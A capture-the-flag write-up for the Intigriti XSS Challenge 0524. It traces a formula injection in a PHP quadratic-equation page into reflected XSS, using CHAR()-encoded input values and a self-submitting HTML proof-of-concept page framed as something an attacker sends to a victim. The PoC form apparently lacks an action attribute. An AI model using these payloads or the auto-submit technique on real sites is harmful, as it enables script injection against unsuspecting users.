# Intigriti XSS Challenge 0524

## Challenge description
According to Intigirti's website, an XSS vulnerability needs to be found in this challenge. The following XSS payload should be used: `<script>alert(document.domain)</script>` and the payload has to be triggered without any interaction from the user. That's basically all. 

## Analysis of the website code
In this challenge we have a HTML form that accepts 3 input parameters A,B and C which is meant to solve a quadratic equation. 
```
<form method="POST">

    <div class="input-group mb-3">
        <span class="input-group-text" id="labelA">A</span>
        <input type="text" class="form-control" name="A" aria-describedby="labelA" aria-label="A"
                value="">
    </div>

    <div class="input-group mb-3">
        <span class="input-group-text" id="labelB">B</span>
        <input type="text" class="form-control" name="B" aria-describedby="labelB" aria-label="B"
                value="">
    </div>

    <div class="input-group mb-3">
        <span class="input-group-text" id="labelC">C</span>
        <input type="text" class="form-control" name="C" aria-describedby="labelC" aria-label="C"
                value="">
    </div>

    <div class="d-flex justify-content-between">
        <a class="btn btn-light" href="/challenge.php?source=challenge.php" role="button">View Source</a>
        <button name="submit" type="submit" class="btn btn-primary">Calculate</button>
    </div>


    </div>
</form>
```

When the form is submitted, the values in are processed by the following PHP code:
```
if (isset($_POST['submit'])) {
    if (empty($_POST['A']) || empty($_POST['B']) || empty($_POST['C'])) {
        echo "<div class='alert alert-danger mt-3' role='alert'>Error: Missing vars...</div>";
    }
    elseif ($_POST['A'] == 0) {
        echo "<div class='alert alert-danger mt-3' role='alert'>Error: The equation is not quadratic</div>";
    } else {
        // Calculate and Display the results
        echo "<div class='alert alert-info mt-3' role='alert'>";
        echo '<b>Roots:</b><br>';

        $discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';

        $discriminant = Calculation::getInstance()->calculateFormula($discriminantFormula);

        $r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
        $r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';

        echo Calculation::getInstance()->calculateFormula($r1Formula);
        echo Calculation::getInstance()->calculateFormula($r2Formula);
        echo "</div>";
    }
}
?>
```
It can be seen that some prerequisites must be fulfilled in order to reach the main code of the application:    
- The parameters A,B,C must be set. 
- Parameter A must not be zero

When these conditions are met, the code that contains the main logic of the application is reached. We can see that some formulas are assembled and get calculated. If we take a closer look at the code we can see that the following PHP library is imported at line 10: 
```
use PhpOffice\PhpSpreadsheet\Calculation\Calculation;
```
This is a PHP library that lets you, amongst others, evaluate MS Excel-like formulas. Another interesting thing that stands out is that the parameters A,B,C are inserted into the formulas unsanitised. In other words, this means that there is a formula injection vulnerability present in this case. To verify this assumption, we try to trigger an error in the formula calculation on the server side. For example, we send the following values:
```
A: 1
B: *2
C: 2
```
After submitting these values, we actually receive a server error with the following text: `Uncaught PhpOffice\PhpSpreadsheet\Calculation\Exception: Formula Error: Unexpected operator '*'`. We have proven the formula injection and can are now able to inject any formula code into the individual formulas. 

## From formula injection to XSS 
In order to build an XSS attack vector from the formula injection vulnerability, we have to take a closer look at the creation of the formulas. The following code is called when a quadratic equation sould be solved: 
```
$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';

$discriminant = Calculation::getInstance()->calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';

echo Calculation::getInstance()->calculateFormula($r1Formula);
echo Calculation::getInstance()->calculateFormula($r2Formula);
```
It can be seen that the results of the formula calculation are also injected unsanitsed into the HTML code using the PHP echo function. 

In order to exploit this flaw we first need a formula function that we can use to generate arbitrary chars or strings, since currently only numbers (roots) are embedded in the web page code. After some Googling, it becomes clear that the `CHAR()` function, for example, is a good candidate. It takes a number from 1 to 255 and converts it to an ascii character. 

We try to inject characters into the first formula (r1Formula). To do this, however, we must first break out of the discriminant formula. Therefore we select the values as follows:

```
A: 1 
B: 0,0)+SUM(
C: 15)&")),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM((0"
```

This results in the formula $discriminantFormula looking like this. I have put the injected parts in brackets:
```
=POWER( [[ 0,0)+SUM( ]] ,2) - (4 * [[ 1 ]] * [[ 15)&")),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM((0" ]])'
              B                       A                             C
```

When this formula is evaluated, this is the result: 
```
#NUM!)),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM((0
```

The `&`-character is used in office-like formulas to concatenate strings. Since the inital discriminant formula could not be calculated to a valid number, `#NUM!` is the output followed by our injected part: `)),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM((0"`. As the $discriminat variable is still used in the formulas afterwards, the string that we have injected is also injected in `$r1Formula` and `$r2Formula`.

After the injection, the `$r1Formula` formula looks like this: 
```
=IMDIV(IMSUM(- [[ 0,0)+SUM( ]],IMSQRT( [[ #NUM!)),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM((0 ]] )),2 * [[ 1 ]])
```

This formula is evaluated like this: 
```
=IMDIV(IMSUM(-0,0)+SUM(,IMSQRT(#NUM!)),2)&CHAR(66)&CHAR(76)&CHAR(65)&SUM(SUM(0),2)
```
The result looks like this:
```
#NUM!BLA2
```
As you can see, we have injected the string "BLA" which is equivalent to `CHAR(66)&CHAR(76)&CHAR(65)`. 

In order to create the XSS payload we have to translate the desired payload (`<script>alert(document.domian)</script>`) into the formulas syntax : 

```
CHAR(60)&CHAR(115)&CHAR(99)&CHAR(114)&CHAR(105)&CHAR(112)&CHAR(116)&CHAR(62)&CHAR(97)&CHAR(108)&CHAR(101)&CHAR(114)&CHAR(116)&CHAR(40)&CHAR(100)&CHAR(111)&CHAR(99)&CHAR(117)&CHAR(109)&CHAR(101)&CHAR(110)&CHAR(116)&CHAR(46)&CHAR(100)&CHAR(111)&CHAR(109)&CHAR(97)&CHAR(105)&CHAR(110)&CHAR(41)&CHAR(60)&CHAR(47)&CHAR(115)&CHAR(99)&CHAR(114)&CHAR(105)&CHAR(112)&CHAR(116)&CHAR(62)
```

Now we just have to insert the XSS payload into the existing formula injection payload: 
```
A: 1
B: 0,0)+SUM(
C: 15)&")),2)&CHAR(60)&CHAR(115)&CHAR(99)&CHAR(114)&CHAR(105)&CHAR(112)&CHAR(116)&CHAR(62)&CHAR(97)&CHAR(108)&CHAR(101)&CHAR(114)&CHAR(116)&CHAR(40)&CHAR(100)&CHAR(111)&CHAR(99)&CHAR(117)&CHAR(109)&CHAR(101)&CHAR(110)&CHAR(116)&CHAR(46)&CHAR(100)&CHAR(111)&CHAR(109)&CHAR(97)&CHAR(105)&CHAR(110)&CHAR(41)&CHAR(60)&CHAR(47)&CHAR(115)&CHAR(99)&CHAR(114)&CHAR(105)&CHAR(112)&CHAR(116)&CHAR(62)&SUM(SUM((0"
```

Submitting the given form with this payload will trigger the desired alert. Another requirement of the challenge is to trigger the XSS without user interaction. To fulfill this requirement, an attacker could host the following HTML code with a self-submitting form on their controlled website: 

```
<html>
<head>
<title>POC</title>
</head>
<body>
<form method="POST">

<div class="input-group mb-3">
    <span class="input-group-text" id="labelA">A</span>
    <input type="text" class="form-control" name="A" aria-describedby="labelA" aria-label="A"
            value="1">
</div>

<div class="input-group mb-3">
    <span class="input-group-text" id="labelB">B</span>
    <input type="text" class="form-control" name="B" aria-describedby="labelB" aria-label="B"
            value="0,0)+SUM(">
</div>

<div class="input-group mb-3">
    <span class="input-group-text" id="labelC">C</span>
    <input type="text" class="form-control" name="C" aria-describedby="labelC" aria-label="C"
            value="15)&amp;&quot;)),2)&amp;CHAR(60)&amp;CHAR(115)&amp;CHAR(99)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(112)&amp;CHAR(116)&amp;CHAR(62)&amp;CHAR(97)&amp;CHAR(108)&amp;CHAR(101)&amp;CHAR(114)&amp;CHAR(116)&amp;CHAR(40)&amp;CHAR(100)&amp;CHAR(111)&amp;CHAR(99)&amp;CHAR(117)&amp;CHAR(109)&amp;CHAR(101)&amp;CHAR(110)&amp;CHAR(116)&amp;CHAR(46)&amp;CHAR(100)&amp;CHAR(111)&amp;CHAR(109)&amp;CHAR(97)&amp;CHAR(105)&amp;CHAR(110)&amp;CHAR(41)&amp;CHAR(60)&amp;CHAR(47)&amp;CHAR(115)&amp;CHAR(99)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(112)&amp;CHAR(116)&amp;CHAR(62)&amp;SUM(SUM((0&quot;">
</div>

<div class="d-flex justify-content-between">
    <a class="btn btn-light" href="/challenge.php?source=challenge.php" role="button">View Source</a>
    <button name="submit" type="submit" class="btn btn-primary">Calculate</button>
</div>
</form>
    <script>
        document.getElementsByName("submit")[0].click()
    </script>
</body>

```
The attacker just needs to send the link to his website containing the HTML form to the victim. As soon as the victim clicks on the link the form is submitted automatically and the XSS payload injected into HTML, which leads to the execution of our XSS payload. 

Now we solved the challenge :)